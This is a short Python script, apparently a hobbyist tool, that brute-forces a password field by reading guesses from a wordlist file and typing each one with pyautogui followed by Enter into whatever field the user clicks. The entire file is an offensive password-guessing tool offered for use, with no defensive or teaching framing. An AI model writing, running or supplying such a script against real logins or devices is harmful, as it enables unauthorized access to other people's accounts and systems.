#coding: utf-8
# -*- coding:utf-8 -*-

import sys
import time
import pyautogui
import os.path
from os import path


R = '\033[31m' # red
C = '\033[36m' # cyan
W = '\033[0m'  # white
G = '\033[32m' # green
os.system('cls')

try:

  if(path.exists('./BruteForce/wordlist.txt') == True) :
      foundFile = True
      print('\n' + ''+ C +' >> Starting service' + W + '\n')  
  else :
      print('ERROR: Create a file named "wordlist.txt" and place it in this folder.')
      exit()
  
 
  def inputlist():
        passcrack('./BruteForce/wordlist.txt')
                
        
  def passcrack(file_name):
    word_list = open(file_name,'r')
    words = word_list.read()
    word_list.close()
    word_list = words.split("\n")
    print("\n" + R +'CLICK ON THE FIELD !' + W + "\n"  )
    time.sleep(5)
    
    
    for word in word_list[0::]:
        pyautogui.hotkey('ctrl','a')
        time.sleep(1)
        pyautogui.typewrite(word, interval=0.0001)
        pyautogui.typewrite(['enter'])
        print(word)
        
  inputlist()
  
  
except KeyboardInterrupt:
    print('')
    
    

# _______________________________________________________________________________________#